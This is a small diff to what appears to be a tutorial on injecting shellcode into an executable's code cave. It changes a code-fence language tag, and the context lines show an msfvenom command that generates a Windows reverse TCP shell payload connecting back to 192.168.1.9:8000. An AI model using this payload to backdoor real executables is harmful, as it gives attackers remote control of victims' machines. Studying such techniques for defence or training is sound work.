@@ -55,7 +55,7 @@ First we will generate our shellcode to inject it in the executable code cave th
 
 Generate the shellcode with **msfvenom** by executing:
 
-```assembly
+```bash
 msfvenom --arch x86 --platform windows --payload windows/shell_reverse_tcp LHOST=192.168.1.9 LPORT=8000 -f hex
 ```
 
